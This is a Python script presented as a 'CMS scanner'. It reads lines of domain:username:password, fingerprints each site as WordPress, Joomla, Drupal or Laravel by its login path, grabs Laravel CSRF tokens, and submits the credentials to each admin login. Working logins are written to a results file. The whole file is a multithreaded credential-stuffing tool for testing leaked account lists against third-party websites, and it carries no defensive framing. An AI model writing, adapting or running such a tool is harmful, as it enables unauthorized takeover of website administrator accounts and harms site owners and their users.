import requests
import threading
import queue
import re
from urllib.parse import urljoin
import logging
import sys
from colorama import Fore, Style, init
import os

# Initialize colorama for colored console output
init()

# ASCII Art Header and Subheader
HEADER = """
░█████╗░██╗░░██╗░░███╗░░░█████╗░░█████╗██╗███╗███
██╔══██╗╚██╗██╔╝░████║░░██╔══██╗██╔═╝██╗████████
██║░░██║░╚███╔╝░██╔██║░░╚██████║█████╗███╔════███╗
██║░░██║░██╔██╗░╚═╝██║░░░╚═══██║██╔═╝██║═════██║
╚█████╔╝██╔╝╚██╗███████╗░█████╔╝███╗███╗█████╔╝
░╚════╝░╚═╝░░╚═╝╚══════╝░╚════╝░░╚═╝╚═╝╚═════╝░
"""

SUBHEADER = """
███████╗██╗░░██╗███████╗███╗░░██╗░██████╗░███╗░░██╗██╗██╗░░░██╗
╚════██║██║░░██║██╔════╝████╗░██║██╔════╝░████╗░██║██║██║░░░██║
░░███╔═╝███████║█████╗░░██╔██╗██║██║░░██╗░██╔██╗██║██║██║░░░██║
██╔══╝░░██╔══██║██╔══╝░░██║╚████║██║░░╚██╗██║╚████║██║██║░░░██║
███████╗██║░░██║███████╗██║░╚███║╚██████╔╝██║░╚███║██║╚██████╔╝
╚══════╝╚═╝░░╚═╝╚══════╝╚═╝░░╚══╝░╚═════╝░╚═╝░░╚══╝╚═╝░╚═════╝░
Scanner Cms - Joomla - Laravel - Wordpress 
"""

# Setup logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# CMS-specific login configurations
CMS_CONFIGS = {
    'wordpress': {
        'login_path': '/wp-login.php',
        'post_data': lambda user, pwd: {'log': user, 'pwd': pwd, 'wp-submit': 'Log In'},
        'success_pattern': re.compile(r'wp-admin|dashboard', re.I),
        'failure_pattern': re.compile(r'login_error|incorrect', re.I)
    },
    'joomla': {
        'login_path': '/administrator/index.php',
        'post_data': lambda user, pwd: {'username': user, 'passwd': pwd, 'option': 'com_login', 'task': 'login'},
        'success_pattern': re.compile(r'administrator.*control panel', re.I),
        'failure_pattern': re.compile(r'username and password do not match', re.I)
    },
    'drupal': {
        'login_path': '/user/login',
        'post_data': lambda user, pwd: {'name': user, 'pass': pwd, 'form_id': 'user_login_form', 'op': 'Log in'},
        'success_pattern': re.compile(r'user/\d+|dashboard', re.I),
        'failure_pattern': re.compile(r'sorry, unrecognized', re.I)
    },
    'laravel': {
        'login_path': '/login',
        'post_data': lambda user, pwd: {'email': user, 'password': pwd, '_token': ''},
        'success_pattern': re.compile(r'dashboard|home', re.I),
        'failure_pattern': re.compile(r'these credentials do not match', re.I)
    }
}

def detect_cms(url):
    """Detect CMS type by checking for specific login paths."""
    session = requests.Session()
    for cms, config in CMS_CONFIGS.items():
        try:
            login_url = urljoin(url, config['login_path'])
            response = session.get(login_url, timeout=5)
            if response.status_code == 200:
                return cms, login_url
        except requests.RequestException:
            continue
    return None, None

def check_credentials(url, username, password, found_file_lock, notfound_file_lock, found_queue, notfound_queue):
    """Check if credentials are valid for the detected CMS."""
    try:
        # Detect CMS and get login URL
        cms, login_url = detect_cms(url)
        result_str = f"URL: {url}, Username: {username}, Password: {password}"
        
        if not cms:
            with notfound_file_lock:
                notfound_queue.put((result_str, f"{Fore.RED}[ NOTFOUND ]{Style.RESET_ALL} Unknown CMS or invalid URL"))
            return

        # Get CMS configuration
        config = CMS_CONFIGS[cms]
        session = requests.Session()

        # Prepare login request
        post_data = config['post_data'](username, password)
        if cms == 'laravel':
            # Fetch CSRF token for Laravel
            response = session.get(login_url, timeout=5)
            token_match = re.search(r'name="_token"\s+value="([^"]+)"', response.text)
            if token_match:
                post_data['_token'] = token_match.group(1)

        # Send login request
        response = session.post(login_url, data=post_data, timeout=10, allow_redirects=True)

        # Check response for success or failure
        if config['success_pattern'].search(response.text):
            status = f"{Fore.GREEN}[ FOUND ]{Style.RESET_ALL} Valid - {cms.capitalize()}"
            with found_file_lock:
                found_queue.put((result_str, status))
        elif config['failure_pattern'].search(response.text):
            status = f"{Fore.RED}[ NOTFOUND ]{Style.RESET_ALL} Invalid credentials"
            with notfound_file_lock:
                notfound_queue.put((result_str, status))
        else:
            status = f"{Fore.RED}[ NOTFOUND ]{Style.RESET_ALL} Unexpected response"
            with notfound_file_lock:
                notfound_queue.put((result_str, status))

    except requests.RequestException as e:
        status = f"{Fore.RED}[ NOTFOUND ]{Style.RESET_ALL} Error: {str(e)}"
        with notfound_file_lock:
            notfound_queue.put((result_str, status))

def read_credentials(file_path):
    """Read credentials from file in format domain:user:password."""
    credentials_list = []
    try:
        with open(file_path, 'r') as file:
            for line in file:
                line = line.strip()
                if line:
                    parts = line.split(':')
                    if len(parts) >= 3:
                        domain = parts[0]
                        username = parts[1]
                        password = ':'.join(parts[2:])
                        credentials_list.append((domain, username, password))
                    else:
                        logging.warning(f"Invalid format in line: {line}")
    except FileNotFoundError:
        logging.error(f"File {file_path} not found.")
    except Exception as e:
        logging.error(f"Error reading file: {str(e)}")
    return credentials_list

def write_results(found_queue, notfound_queue, found_file_lock, notfound_file_lock):
    """Write results to output files from queues."""
    with open('file.txt', 'w') as found_file, open('notfound.txt', 'w') as notfound_file:
        while True:
            # Write found results
            try:
                result_str, status = found_queue.get_nowait()
                with found_file_lock:
                    found_file.write(f"{result_str}, Status: {status.replace(Fore.GREEN, '').replace(Style.RESET_ALL, '')}\n")
                    found_file.flush()
                print(f"{result_str}, Status: {status}")
            except queue.Empty:
                pass

            # Write notfound results
            try:
                result_str, status = notfound_queue.get_nowait()
                with notfound_file_lock:
                    notfound_file.write(f"{result_str}, Status: {status.replace(Fore.RED, '').replace(Style.RESET_ALL, '')}\n")
                    notfound_file.flush()
                print(f"{result_str}, Status: {status}")
            except queue.Empty:
                pass

            # Exit if both queues are empty and all threads are done
            if found_queue.empty() and notfound_queue.empty() and threading.active_count() == 2:  # Main thread + writer thread
                break

def main():
    # Print header and subheader
    print(HEADER)
    print(SUBHEADER)

    # Check for input file argument
    if len(sys.argv) != 2:
        print("Usage: python3 cms_checker.py <input_file.txt>")
        sys.exit(1)

    file_path = sys.argv[1]
    if not os.path.exists(file_path):
        print(f"File {file_path} not found. Exiting.")
        sys.exit(1)

    # Read credentials from file
    credentials_list = read_credentials(file_path)
    if not credentials_list:
        print("No valid credentials found in the selected file.")
        sys.exit(1)

    # Initialize queues and locks
    found_queue = queue.Queue()
    notfound_queue = queue.Queue()
    found_file_lock = threading.Lock()
    notfound_file_lock = threading.Lock()

    # Start writer thread
    writer_thread = threading.Thread(target=write_results, args=(found_queue, notfound_queue, found_file_lock, notfound_file_lock), daemon=True)
    writer_thread.start()

    # Start worker threads
    threads = []
    for url, username, password in credentials_list:
        thread = threading.Thread(
            target=check_credentials,
            args=(url, username, password, found_file_lock, notfound_file_lock, found_queue, notfound_queue)
        )
        threads.append(thread)
        thread.start()

    # Wait for all worker threads to complete
    for thread in threads:
        thread.join()

    # Wait for writer thread to finish
    writer_thread.join()

    print("\nScanning complete. Results saved to 'file.txt' and 'notfound.txt'.")

if __name__ == '__main__':
    main()
